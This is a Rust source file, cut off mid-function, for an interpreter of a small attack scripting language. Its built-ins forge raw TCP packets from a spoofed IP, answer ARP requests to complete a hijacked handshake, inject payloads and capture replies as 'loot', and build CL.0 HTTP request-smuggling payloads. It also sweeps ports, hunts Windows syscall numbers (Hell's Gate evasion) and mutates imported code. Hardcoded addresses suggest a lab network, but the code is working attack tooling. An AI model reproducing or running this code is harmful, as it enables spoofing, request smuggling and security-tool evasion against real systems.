use regex::Regex;
use std::collections::HashMap;
use std::env;
use std::fs::{self, OpenOptions};
use std::io::{self, Read, Write as StdWrite};
use std::net::{TcpStream, ToSocketAddrs, Ipv4Addr};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

// Raw socket interface using libpnet
use pnet::datalink;
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::datalink::Channel::Ethernet;
use pnet::packet::{MutablePacket, Packet};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::ipv4::{checksum as ipv4_checksum, Ipv4Packet, MutableIpv4Packet};
use pnet::packet::tcp::{ipv4_checksum as tcp_checksum, MutableTcpPacket, TcpFlags, TcpPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::util::MacAddr;

#[cfg(target_os = "windows")]
use std::ffi::CString;
#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};

// -------------------------------------------------
// Core Data Types
// -------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
enum Token {
    Keyword(String),
    Identifier(String),
    Number(f64),
    IpAddress(String),
    StringLiteral(String),
    Compare(String),
    Assign,
    Operator(String),
    Delimiter,
    Punctuation(String),
}

#[derive(Debug, Clone, PartialEq)]
enum Value { 
    Num(f64), 
    Str(String), 
    Bool(bool), 
    List(Vec<Value>),
    Dict(HashMap<String, Value>),
    // Represents a compromised gateway connection
    Gateway { target_ip: String, target_mac: [u8; 6], next_seq: u32, next_ack: u32 },
    None 
}

// -------------------------------------------------
// Windows syscall number extraction (Hell's Gate)
// -------------------------------------------------

#[cfg(target_os = "windows")]
const SYSCALL_STUB: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8];

#[cfg(target_os = "windows")]
unsafe fn hunt_ssn(function_address: *const u8) -> Option<u32> {
    unsafe {
        for offset in 0..32 {
            let current_ptr = function_address.add(offset);
            let bytes = std::slice::from_raw_parts(current_ptr, 4);
            if bytes == SYSCALL_STUB {
                let ssn_ptr = current_ptr.add(4) as *const u32;
                return Some(ptr::read_unaligned(ssn_ptr));
            }
        }
    }
    None
}

// -------------------------------------------------
// Low-level packet construction
// -------------------------------------------------

fn forge_packet(
    source_ip: Ipv4Addr, dest_ip: Ipv4Addr, source_mac: MacAddr, dest_mac: MacAddr,
    seq_num: u32, ack_num: u32, tcp_flags: u8, payload: &[u8],
) -> Vec<u8> {
    let packet_size = 14 + 20 + 20 + payload.len(); // Eth + IP + TCP + Payload
    let mut buffer = vec![0u8; packet_size];
    
    let mut eth_packet = MutableEthernetPacket::new(&mut buffer).unwrap();
    eth_packet.set_destination(dest_mac);
    eth_packet.set_source(source_mac);
    eth_packet.set_ethertype(EtherTypes::Ipv4);

    let mut ip_packet = MutableIpv4Packet::new(eth_packet.payload_mut()).unwrap();
    ip_packet.set_version(4);
    ip_packet.set_header_length(5);
    ip_packet.set_total_length((40 + payload.len()) as u16);
    ip_packet.set_ttl(64);
    ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    ip_packet.set_source(source_ip);
    ip_packet.set_destination(dest_ip);
    let checksum = ipv4_checksum(&ip_packet.to_immutable());
    ip_packet.set_checksum(checksum);

    let mut tcp_packet = MutableTcpPacket::new(ip_packet.payload_mut()).unwrap();
    tcp_packet.set_source(8888);
    tcp_packet.set_destination(80);
    tcp_packet.set_sequence(seq_num);
    tcp_packet.set_acknowledgement(ack_num);
    tcp_packet.set_window(64240);
    tcp_packet.set_data_offset(5);
    tcp_packet.set_flags(tcp_flags);
    
    // Copy payload into TCP segment
    if !payload.is_empty() { tcp_packet.payload_mut().copy_from_slice(payload); }
    
    let tcp_chk = tcp_checksum(&tcp_packet.to_immutable(), &source_ip, &dest_ip);
    tcp_packet.set_checksum(tcp_chk);

    buffer
}

// -------------------------------------------------
// Lexer
// -------------------------------------------------

fn lexer(code: &str) -> Vec<Token> {
    let mut tokens = Vec::new();
    let token_rules = vec![
        ("SKIP", r"[ \t\n\r]+|//.*"),
        ("TYPE_IP", r"\b(?:\d{1,3}\.){3}\d{1,3}\b"),
        ("NUMBER", r"\d+(\.\d*)?"),
        ("KEYWORD", r"\b(desync|gateway|set|scan|payload|if|while|for|in|end|log|swarm|ports|to|write|append|wait|list|push|pop|rand|op|call|resolve|input|transmit|import|fn|return|dict|put|get|try|rescue|panic|num|break)\b"),
        ("ID", r"[a-zA-Z_][a-zA-Z0-9_]*"),
        ("COMP", r"==|!=|<=|>=|=>|<|>"), 
        ("ASSIGN", r"="),
        ("OP", r"[+\-*/%]"),            
        ("STRING", r#""(?:\\.|[^"\\])*""#),
        ("DELIM", r";"),
        ("PUNCT", r"[{}():,]"),
    ];

    let combined_regex = token_rules.iter().map(|(n, p)| format!("(?P<{}>{})", n, p)).collect::<Vec<_>>().join("|");
    let re = Regex::new(&combined_regex).unwrap();
    let mut last_end = 0;

    for caps in re.captures_iter(code) {
        let m = caps.get(0).unwrap();
        if m.start() > last_end { 
            let broken_snippet = &code[last_end..m.start()];
            panic!("Lexer error at offset {}. Unrecognized token: '{}'", last_end, broken_snippet); 
        }
        last_end = m.end();
        let val = m.as_str().to_string();
        
        if caps.name("SKIP").is_some() { continue; }
        else if caps.name("KEYWORD").is_some() { tokens.push(Token::Keyword(val)); }
        else if caps.name("TYPE_IP").is_some() { tokens.push(Token::IpAddress(val)); }
        else if caps.name("NUMBER").is_some() { tokens.push(Token::Number(val.parse().unwrap())); }
        else if caps.name("ID").is_some() { tokens.push(Token::Identifier(val)); }
        else if caps.name("COMP").is_some() { tokens.push(Token::Compare(val)); }
        else if caps.name("ASSIGN").is_some() { tokens.push(Token::Assign); }
        else if caps.name("OP").is_some() { tokens.push(Token::Operator(val)); }
        else if caps.name("STRING").is_some() { 
            let inner_string = &val[1..val.len()-1];
            let clean_string = inner_string.replace("\\\"", "\"").replace("\\n", "\n");
            tokens.push(Token::StringLiteral(clean_string)); 
        }
        else if caps.name("DELIM").is_some() { tokens.push(Token::Delimiter); }
        else if caps.name("PUNCT").is_some() { tokens.push(Token::Punctuation(val)); }
    }
    tokens
}

fn mutate_token_stream(tokens: Vec<Token>) -> Vec<Token> {
    let mut mutated = Vec::new();
    for token in tokens {
        mutated.push(token.clone());
        if let Token::Delimiter = token {
            let seed = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().subsec_nanos() as usize;
            if seed % 10 < 2 {
                let id = format!("_v_{}", seed % 100);
                mutated.push(Token::Keyword("set".to_string()));
                mutated.push(Token::Identifier(id));
                mutated.push(Token::Assign);
                mutated.push(Token::Number(1.0));
                mutated.push(Token::Delimiter);
            }
        }
    }
    mutated
}

fn format_address(ip: &str, port: u16) -> String {
    if ip.contains(':') { format!("[{}]:{}", ip, port) } else { format!("{}:{}", ip, port) }
}

// -------------------------------------------------
// Parser and runtime
// -------------------------------------------------

struct Parser {
    tokens: Vec<Token>,
    pos: usize,
    memory: HashMap<String, Value>,
    functions: HashMap<String, (Vec<String>, Vec<Token>)>, 
    has_error: bool, 
    return_value: Value,
    has_break: bool,
}

impl Parser {
    fn new(tokens: Vec<Token>) -> Self { 
        Parser { 
            tokens, pos: 0, memory: HashMap::new(), 
            functions: HashMap::new(), has_error: false, 
            return_value: Value::None, has_break: false
        } 
    }
    
    fn peek(&self) -> Option<Token> { self.tokens.get(self.pos).cloned() }
    fn next(&mut self) { self.pos += 1; }
    
    fn expect_keyword(&mut self, kw: &str) {
        if let Some(Token::Keyword(k)) = self.peek() { if k == kw { self.next(); return; } }
        panic!("Runtime error: expected keyword '{}'", kw);
    }

    fn parse(&mut self) { while self.pos < self.tokens.len() { self.parse_stmt(); } }

    fn parse_stmt(&mut self) {
        // Handle gateway pipe syntax: id => payload
        if let Some(Token::Identifier(ref id)) = self.peek() {
            if self.tokens.get(self.pos + 1) == Some(&Token::Compare("=>".to_string())) {
                let id_clone = id.clone();
                self.parse_pipe_injection(id_clone);
                return;
            }
        }

        if let Some(Token::Keyword(k)) = self.peek() {
            match k.as_str() {
                "set" => self.parse_assignment(), "log" => self.parse_log(), "scan" => self.parse_scan(),
                "swarm" => self.parse_swarm(), "payload" => self.parse_payload(), "transmit" => self.parse_transmit(), 
                "import" => self.parse_import(), "while" => self.parse_while(), "for" => self.parse_for(),
                "if" => self.parse_standard_if(), "wait" => self.parse_wait(), "write" => self.parse_file_op(false),
                "append" => self.parse_file_op(true), "push" => self.parse_push(), "pop" => self.parse_pop(),
                "fn" | "op" => self.parse_fn(), "return" => self.parse_return(), 
                "call" => { self.parse_call(); if let Some(Token::Delimiter) = self.peek() { self.next(); } },
                "put" => self.parse_put(), "try" => self.parse_try(), "panic" => self.parse_panic(),
                "break" => { self.has_break = true; self.next(); if let Some(Token::Delimiter) = self.peek() { self.next(); } },
                "end" => self.next(), _ => self.next(),
            }
        } else { self.next(); }
    }

    // -------------------------------------------------
    // Low-level network interaction
    // -------------------------------------------------

    fn parse_gateway(&mut self) -> Value {
    self.expect_keyword("gateway");
    let target_ip_str = if let Value::Str(s) = self.parse_factor() { s } else { panic!("IP address required"); };
    let phantom_ip = Ipv4Addr::new(192, 168, 56, 200);
    let dest_ip: Ipv4Addr = target_ip_str.parse().expect("Bad IP");

    let ifaces = datalink::interfaces();
    let iface = ifaces.into_iter().find(|i| i.ips.iter().any(|ip| ip.ip().to_string() == "192.168.56.1")).unwrap();
    let source_mac = iface.mac.unwrap();
    let d_mac = MacAddr(0x08, 0x00, 0x27, 0x62, 0x85, 0x77); // Target MAC address (Ubuntu VM)

    let (mut tx, mut rx) = match datalink::channel(&iface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        _ => panic!("Sock err"),
    };

    let syn = forge_packet(phantom_ip, dest_ip, source_mac, d_mac, 1000, 0, TcpFlags::SYN, &[]);
    tx.send_to(&syn, None).unwrap().unwrap();

    let (h_seq, h_ack);
    loop {
        let pkt = rx.next().unwrap();
        let eth = EthernetPacket::new(pkt).unwrap();

        // Handle ARP response for IP address
        if eth.get_ethertype() == EtherTypes::Arp {
            if let Some(arp) = ArpPacket::new(eth.payload()) {
                if arp.get_target_proto_addr() == phantom_ip {
                    let mut ab = [0u8; 28];
                    let mut rep = MutableArpPacket::new(&mut ab).unwrap();
                    rep.set_operation(ArpOperations::Reply);
                    rep.set_sender_hw_addr(source_mac);
                    rep.set_sender_proto_addr(phantom_ip);
                    rep.set_target_hw_addr(arp.get_sender_hw_addr());
                    rep.set_target_proto_addr(arp.get_sender_proto_addr());
                    rep.set_hardware_type(ArpHardwareTypes::Ethernet);
                    rep.set_protocol_type(EtherTypes::Ipv4);
                    rep.set_hw_addr_len(6); rep.set_proto_addr_len(4);

                    let mut eb = [0u8; 42];
                    let mut er = MutableEthernetPacket::new(&mut eb).unwrap();
                    er.set_destination(arp.get_sender_hw_addr());
                    er.set_source(source_mac);
                    er.set_ethertype(EtherTypes::Arp);
                    er.set_payload(rep.packet());
                    tx.send_to(er.packet(), None).unwrap().unwrap();
                }
            }
        }

        // Process TCP handshake
        if let Some(ip) = Ipv4Packet::new(eth.payload()) {
            if let Some(tcp) = TcpPacket::new(ip.payload()) {
                if ip.get_destination() == phantom_ip && tcp.get_flags() == (TcpFlags::SYN | TcpFlags::ACK) {
                    h_seq = tcp.get_sequence();
                    h_ack = 1001;
                    let ack = forge_packet(phantom_ip, dest_ip, source_mac, d_mac, h_ack, h_seq + 1, TcpFlags::ACK, &[]);
                    tx.send_to(&ack, None).unwrap().unwrap();
                    break;
                }
            }
        }
    }
    // Handshake completed
    println!("Handshake established with remote host. Sequence: {}, Acknowledgment: {}", h_seq, h_ack);

    Value::Gateway { 
        target_ip: target_ip_str, 
        target_mac: [0x08, 0x00, 0x27, 0x62, 0x85, 0x77], 
        next_seq: h_ack,   // Final sequence number for subsequent packets
        next_ack: h_seq + 1 // Final acknowledgement number
    }
}

    fn parse_desync(&mut self) -> Value {
    self.expect_keyword("desync");
    if let Some(Token::Punctuation(p)) = self.peek() { if p == "(" { self.next(); } }
    let _mode = if let Value::Str(s) = self.parse_factor() { s } else { panic!("Mode parameter required"); };
    if let Some(Token::Punctuation(p)) = self.peek() { if p == "," { self.next(); } }
    let end = if let Value::Str(s) = self.parse_factor() { s } else { panic!("Endpoint parameter required"); };
    if let Some(Token::Punctuation(p)) = self.peek() { if p == "," { self.next(); } }
    let host = if let Value::Str(s) = self.parse_factor() { s } else { panic!("Host parameter required"); };
    if let Some(Token::Punctuation(p)) = self.peek() { if p == ")" { self.next(); } }

    // Construct CL.0 request smuggling payload
    // Embed a secondary GET request within the Content-Length header
    let smuggled = format!("GET {} HTTP/1.1\r\nHost: {}\r\n\r\n", end, host);
    
    let payload = format!(
        "GET / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nConnection: keep-alive\r\n\r\n{}",
        host, smuggled.len(), smuggled
    );
    
    Value::Str(payload)
}

    fn parse_pipe_injection(&mut self, gateway_id: String) {
        self.next(); // Consume ID
        self.next(); // Consume '=>'
        
        let payload_val = self.parse_expr();
        let payload_str = if let Value::Str(s) = payload_val { s } else { panic!("Payload must be a string value"); };
        
        if let Some(Token::Delimiter) = self.peek() { self.next(); }

        let gateway = self.memory.get(&gateway_id).cloned().expect("Gateway variable not found");
        
        if let Value::Gateway { target_ip, target_mac, mut next_seq, next_ack } = gateway {
            println!("\nTransmitting payload to {} via established channel", target_ip);
            
            let interfaces = datalink::interfaces();
            let interface = interfaces.into_iter()
                .find(|iface| iface.ips.iter().any(|ip| ip.ip().to_string() == "192.168.56.1"))
                .unwrap();
                
            let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
                Ok(Ethernet(tx, rx)) => (tx, rx),
                _ => panic!("Socket error"),
            };

            let source_ip = Ipv4Addr::new(192, 168, 56, 200);
            let dest_ip: Ipv4Addr = target_ip.parse().unwrap();
            let smac = interface.mac.unwrap();
            let dmac = MacAddr(target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);

            let payload_bytes = payload_str.replace("\\r", "\r").replace("\\n", "\n");
            
            let psh_packet = forge_packet(
                source_ip, dest_ip, smac, dmac, next_seq, next_ack, 
                TcpFlags::PSH | TcpFlags::ACK, payload_bytes.as_bytes()
            );
            
            tx.send_to(&psh_packet, None).unwrap().unwrap();
            
            next_seq += payload_bytes.len() as u32;
            self.memory.insert(gateway_id, Value::Gateway { target_ip, target_mac, next_seq, next_ack });
            
            println!("Payload transmission completed.");
        } else {
            panic!("Pipe operation requires a gateway variable");
        }
    }

    fn execute_extraction(&mut self, gw_id: String) -> Value {
        let gateway = self.memory.get(&gw_id).cloned().expect("Gateway variable not found");
        
        if let Value::Gateway { target_ip, .. } = gateway {
            println!("Awaiting response from target {}...", target_ip);
            
            let interfaces = datalink::interfaces();
            let interface = interfaces.into_iter().find(|iface| iface.ips.iter().any(|ip| ip.ip().to_string() == "192.168.56.1")).unwrap();
            let (_, mut rx) = match datalink::channel(&interface, Default::default()) {
                Ok(Ethernet(tx, rx)) => (tx, rx),
                _ => panic!("Socket error"),
            };

            let start_time = std::time::Instant::now();
            let mut loot = String::new();

            loop {
                if start_time.elapsed().as_secs() > 3 { break; } 
                if let Ok(packet) = rx.next() {
                    if let Some(eth) = EthernetPacket::new(packet) {
                        if let Some(ipv4) = Ipv4Packet::new(eth.payload()) {
                            if let Some(tcp) = TcpPacket::new(ipv4.payload()) {
                                if tcp.get_source() == 80 && ipv4.get_source().to_string() == target_ip {
                                    let payload = tcp.payload();
                                    if !payload.is_empty() {
                                        let data = String::from_utf8_lossy(payload).to_string();
                                        loot.push_str(&data);
                                        println!("Received {} bytes of payload data.", payload.len());
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if loot.is_empty() { println!("No response received from target within allocated time window."); }
            Value::Str(loot)
        } else {
            panic!("Variable is not a gateway object");
        }
    }

    // -------------------------------------------------
    // Language feature implementations
    // -------------------------------------------------

    fn parse_factor(&mut self) -> Value {
        let tok = self.peek().expect("Unexpected EOF"); 
        match tok {
            Token::Number(n) => { self.next(); Value::Num(n) },
            Token::StringLiteral(s) | Token::IpAddress(s) => { self.next(); Value::Str(s) },
            Token::Identifier(id) => { self.next(); self.memory.get(&id).cloned().unwrap_or(Value::Num(0.0)) },
            Token::Keyword(k) if k == "call" => self.parse_call(), Token::Keyword(k) if k == "get" => self.parse_get(),
            Token::Keyword(k) if k == "num" => {
                self.next();
                match self.parse_factor() { Value::Str(s) => Value::Num(s.parse().unwrap_or(0.0)), Value::Num(n) => Value::Num(n), _ => Value::Num(0.0) }
            },
            Token::Compare(op) if op == "<=" => {
                self.next();
                let gw_id = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!("Expected gateway variable after <="); };
                self.execute_extraction(gw_id)
            },
            _ => { self.next(); panic!("Invalid factor type: {:?}", tok); }
        }
    }

    fn parse_fn(&mut self) {
        self.next();
        let name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        let mut args = Vec::new();
        while let Some(Token::Identifier(id)) = self.peek() { self.next(); args.push(id); }
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        let mut body = Vec::new(); let mut depth = 1;
        while let Some(t) = self.peek() {
            self.next();
            if let Token::Keyword(ref k) = t {
                if ["if", "for", "while", "swarm", "scan", "fn", "op", "try"].contains(&k.as_str()) { depth += 1; }
                if k == "end" { depth -= 1; if depth == 0 { break; } }
            }
            body.push(t);
        }
        self.functions.insert(name, (args, body));
    }

    fn parse_return(&mut self) {
        self.expect_keyword("return");
        self.return_value = self.parse_cond(); 
        if let Some(Token::Delimiter) = self.peek() { self.next(); }
    }

    fn parse_call(&mut self) -> Value {
        self.expect_keyword("call");
        let name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        let mut passed_args = Vec::new();
        while self.peek() != Some(Token::Delimiter) && self.peek().is_some() { passed_args.push(self.parse_factor()); }
        if let Some((arg_names, body)) = self.functions.get(&name).cloned() {
            let mut sub = Parser::new(body); sub.functions = self.functions.clone();
            for (i, val) in passed_args.into_iter().enumerate() { if i < arg_names.len() { sub.memory.insert(arg_names[i].clone(), val); } }
            sub.parse(); return sub.return_value;
        }
        Value::None
    }

    fn parse_put(&mut self) {
        self.expect_keyword("put");
        let dict_name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        let key = if let Value::Str(s) = self.parse_factor() { s } else { panic!("Keys must be strings"); };
        let val = self.parse_cond(); 
        if let Some(Token::Delimiter) = self.peek() { self.next(); }
        if let Some(Value::Dict(internal_dict)) = self.memory.get_mut(&dict_name) { internal_dict.insert(key, val); }
    }

    fn parse_get(&mut self) -> Value {
        self.expect_keyword("get");
        let dict_name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        let key = if let Value::Str(s) = self.parse_factor() { s } else { panic!("Keys must be strings"); };
        if let Some(Value::Dict(internal_dict)) = self.memory.get(&dict_name) { return internal_dict.get(&key).cloned().unwrap_or(Value::None); }
        Value::None
    }

    fn parse_try(&mut self) {
        self.expect_keyword("try");
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        self.has_error = false;
        while self.pos < self.tokens.len() {
            if let Some(Token::Keyword(ref k)) = self.peek() { if k == "rescue" || k == "end" { break; } }
            self.parse_stmt(); if self.has_error { break; }
        }
        if self.has_error {
            let mut depth = 1;
            while self.pos < self.tokens.len() {
                if let Some(Token::Keyword(ref k)) = self.peek() {
                    if ["try", "if", "while", "for", "swarm", "fn", "op"].contains(&k.as_str()) { depth += 1; }
                    if k == "end" { depth -= 1; if depth == 0 { break; } }
                    if k == "rescue" && depth == 1 { break; }
                }
                self.next();
            }
        }
        if let Some(Token::Keyword(ref k)) = self.peek() {
            if k == "rescue" {
                self.next();
                if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
                if !self.has_error { self.skip_block(); } else {
                    self.has_error = false;
                    while self.pos < self.tokens.len() {
                        if let Some(Token::Keyword(ref k)) = self.peek() { if k == "end" { break; } }
                        self.parse_stmt();
                    }
                }
            }
        }
        if let Some(Token::Keyword(ref k)) = self.peek() { if k == "end" { self.next(); } }
    }

    fn parse_panic(&mut self) { self.expect_keyword("panic"); self.has_error = true; if let Some(Token::Delimiter) = self.peek() { self.next(); } }

    fn parse_import(&mut self) {
        self.expect_keyword("import");
        let filename = if let Value::Str(s) = self.parse_factor() { s } else { panic!(); };
        if let Some(Token::Delimiter) = self.peek() { self.next(); }
        let imported_code = fs::read_to_string(&filename).unwrap_or_else(|_| panic!("Unable to read file '{}'", filename));
        let mut sub_parser = Parser::new(mutate_token_stream(lexer(&imported_code)));
        sub_parser.memory = self.memory.clone(); sub_parser.functions = self.functions.clone(); sub_parser.parse();
        self.memory = sub_parser.memory; self.functions = sub_parser.functions;
    }

    fn parse_assignment(&mut self) {
        self.expect_keyword("set");
        let name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!("Invalid assignment syntax"); };
        if let Some(Token::Assign) = self.peek() { self.next(); }
        
        let val = if let Some(Token::Keyword(k)) = self.peek() {
            match k.as_str() {
                "list" => { self.next(); Value::List(Vec::new()) },
                "dict" => { self.next(); Value::Dict(HashMap::new()) },
                "rand" => self.parse_rand(), "resolve" => self.parse_resolve(),
                "input" => self.parse_input(), "gateway" => self.parse_gateway(),
                "desync" => self.parse_desync(), // Parse desync operation
                _ => self.parse_cond(),
            }
        } else { self.parse_cond() };
        
        if let Some(Token::Delimiter) = self.peek() { self.next(); }
        self.memory.insert(name, val);
    }

    fn parse_resolve(&mut self) -> Value {
        self.expect_keyword("resolve");
        let host = if let Value::Str(s) = self.parse_factor() { s } else { panic!(); };
        if let Ok(mut addrs) = format!("{}:80", host).to_socket_addrs() { if let Some(a) = addrs.next() { return Value::Str(a.ip().to_string()); } }
        Value::Str("0.0.0.0".to_string())
    }

    fn parse_input(&mut self) -> Value {
        self.expect_keyword("input");
        let prompt = if let Value::Str(s) = self.parse_factor() { s } else { "".to_string() };
        print!("{}", prompt); let _ = io::stdout().flush();
        let mut input = String::new(); let _ = io::stdin().read_line(&mut input);
        Value::Str(input.trim().to_string())
    }

    fn parse_rand(&mut self) -> Value {
        self.expect_keyword("rand"); let start = if let Value::Num(n) = self.parse_factor() { n as i64 } else { 0 };
        self.expect_keyword("to"); let end = if let Value::Num(n) = self.parse_factor() { n as i64 } else { 100 };
        let seed = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().subsec_nanos() as i64;
        Value::Num((start + (seed % (end - start + 1).max(1))) as f64)
    }

    fn parse_log(&mut self) {
        self.expect_keyword("log");
        let val = match self.parse_cond() {
            Value::Num(n) => n.to_string(), Value::Str(s) => s, Value::Bool(b) => b.to_string(), 
            Value::List(l) => format!("{:?}", l), Value::Dict(d) => format!("{:?}", d), 
            Value::Gateway { .. } => "[Raw Ring-0 Gateway Object]".to_string(), Value::None => "None".to_string(),
        };
        println!("{}", val); if let Some(Token::Delimiter) = self.peek() { self.next(); }
    }

    fn parse_cond(&mut self) -> Value {
        let left = self.parse_expr();
        if let Some(Token::Compare(op)) = self.peek() {
            self.next(); let right = self.parse_expr();
            if let (Value::Num(l), Value::Num(r)) = (&left, &right) {
                let res = match op.as_str() { "==" => l == r, "!=" => l != r, ">" => l > r, "<" => l < r, ">=" => l >= r, "<=" => l <= r, _ => false }; return Value::Bool(res);
            }
            if let (Value::Str(l), Value::Str(r)) = (&left, &right) {
                let res = match op.as_str() { "==" => l == r, "!=" => l != r, _ => false }; return Value::Bool(res);
            }
        }
        left
    }

    fn parse_standard_if(&mut self) {
        self.expect_keyword("if");
        let cond = match self.parse_cond() { Value::Bool(b) => b, Value::Num(n) => n != 0.0, _ => false };
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        let mut temp_pos = self.pos; let mut depth = 1;
        while temp_pos < self.tokens.len() {
            if let Token::Keyword(ref k) = self.tokens[temp_pos] {
                if ["if", "swarm", "scan", "while", "for", "op", "fn", "try"].contains(&k.as_str()) { depth += 1; }
                if k == "end" { depth -= 1; if depth == 0 { break; } }
            }
            temp_pos += 1;
        }
        let end_of_if = temp_pos;
        if cond { while self.pos < end_of_if { self.parse_stmt(); if self.has_break { break; } } }
        self.pos = end_of_if + 1;
    }

    fn parse_while(&mut self) {
        self.expect_keyword("while"); let cond_start = self.pos;
        let mut temp_pos = self.pos;
        while temp_pos < self.tokens.len() && self.tokens[temp_pos] != Token::Punctuation(":".to_string()) { temp_pos += 1; }
        temp_pos += 1; let mut depth = 1;
        while temp_pos < self.tokens.len() {
            if let Token::Keyword(ref k) = self.tokens[temp_pos] {
                if ["if", "swarm", "scan", "while", "for", "op", "fn", "try"].contains(&k.as_str()) { depth += 1; }
                if k == "end" { depth -= 1; if depth == 0 { break; } }
            }
            temp_pos += 1;
        }
        let end_of_while = temp_pos;
        loop {
            self.pos = cond_start; self.has_break = false;
            if let Value::Bool(b) = self.parse_cond() {
                if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
                if !b { self.pos = end_of_while + 1; break; }
                while self.pos < end_of_while { self.parse_stmt(); if self.has_break { break; } }
                if self.has_break { self.has_break = false; self.pos = end_of_while + 1; break; }
            } else { self.pos = end_of_while + 1; break; }
        }
    }

    fn parse_expr(&mut self) -> Value {
        let mut res = self.parse_term();
        while let Some(Token::Operator(op)) = self.peek() {
            if op == "+" || op == "-" {
                self.next(); let right = self.parse_term();
                res = match (res, right) {
                    (Value::Num(l), Value::Num(r)) => if op == "+" { Value::Num(l + r) } else { Value::Num(l - r) },
                    (Value::Str(l), Value::Str(r)) => if op == "+" { Value::Str(l + &r) } else { panic!() },
                    (Value::Str(l), Value::Num(r)) => if op == "+" { Value::Str(l + &r.to_string()) } else { panic!() },
                    (Value::Num(l), Value::Str(r)) => if op == "+" { Value::Str(l.to_string() + &r) } else { panic!() },
                    _ => panic!(),
                };
            } else { break; }
        }
        res
    }

    fn parse_term(&mut self) -> Value {
        let mut res = self.parse_factor();
        while let Some(Token::Operator(op)) = self.peek() {
            if op == "*" || op == "/" || op == "%" {
                self.next(); let right = self.parse_factor();
                if let (Value::Num(l), Value::Num(r)) = (&res, &right) { 
                    res = if op == "*" { Value::Num(l * r) } else if op == "/" { Value::Num(l / r) } else { Value::Num(l % r) };
                }
            } else { break; }
        }
        res
    }

    fn parse_scan(&mut self) {
        self.expect_keyword("scan"); let t = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        let ip = match self.memory.get(&t) { Some(Value::Str(s)) => s.clone(), _ => panic!() };
        let port = match self.memory.get("port") { Some(Value::Num(p)) => *p as u16, _ => 80 };
        let addr = format_address(&ip, port);
        let open = if let Ok(s_addr) = addr.to_socket_addrs() {
            if let Some(a) = s_addr.into_iter().next() { TcpStream::connect_timeout(&a, Duration::from_millis(500)).is_ok() } else { false }
        } else { false };
        self.parse_if(open);
    }

    fn parse_swarm(&mut self) {
        self.expect_keyword("swarm"); let t = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        self.expect_keyword("ports"); let s_port = if let Value::Num(n) = self.parse_factor() { n as u16 } else { 0 };
        self.expect_keyword("to"); let e_port = if let Value::Num(n) = self.parse_factor() { n as u16 } else { 0 };
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        let mut body = Vec::new(); let mut d = 1;
        while let Some(tok) = self.peek() {
            self.next();
            if let Token::Keyword(ref k) = tok {
                if ["if", "for", "while", "swarm", "scan", "fn", "op", "try"].contains(&k.as_str()) { d += 1; }
                if k == "end" { d -= 1; if d == 0 { break; } }
            }
            body.push(tok);
        }
        let ip = match self.memory.get(&t) { Some(Value::Str(s)) => s.clone(), _ => panic!() };
        let (mem, fns) = (self.memory.clone(), self.functions.clone());
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let mut ts = vec![];
            for port in s_port..=e_port {
                let (ip_c, sub_c, mut mem_c, fns_c) = (ip.clone(), body.clone(), mem.clone(), fns.clone());
                ts.push(tokio::task::spawn_blocking(move || {
                    let addr = format_address(&ip_c, port);
                    let open = if let Ok(mut resolved) = addr.to_socket_addrs() {
                        if let Some(a) = resolved.next() { TcpStream::connect_timeout(&a, Duration::from_millis(400)).is_ok() } else { false }
                    } else { false };
                    mem_c.insert("port".to_string(), Value::Num(port as f64));
                    let mut p = Parser::new(sub_c); p.memory = mem_c; p.functions = fns_c; p.run_swarm(open);
                }));
            }
            for t in ts { let _ = t.await; }
        });
    }

    fn run_swarm(&mut self, is_open: bool) {
        while self.pos < self.tokens.len() { if let Some(Token::Keyword(ref k)) = self.peek() { if k == "if" { self.parse_if(is_open); } else { self.parse_stmt(); } } else { self.next(); } }
    }

    fn parse_payload(&mut self) {
        self.expect_keyword("payload");
        let t_id = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        let p_id = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else if let Some(Token::Number(n)) = self.peek() { self.next(); n.to_string() } else { panic!(); };
        let raw = if let Some(Token::StringLiteral(s)) = self.peek() { self.next(); s } else { panic!(); };
        let ip = match self.memory.get(&t_id) { Some(Value::Str(s)) => s.clone(), _ => t_id };
        let port = match self.memory.get(&p_id) { Some(Value::Num(n)) => *n as u16, _ => p_id.parse().unwrap_or(80) };
        let addr = format_address(&ip, port);
        if let Ok(mut addrs) = addr.to_socket_addrs() {
            if let Some(a) = addrs.next() {
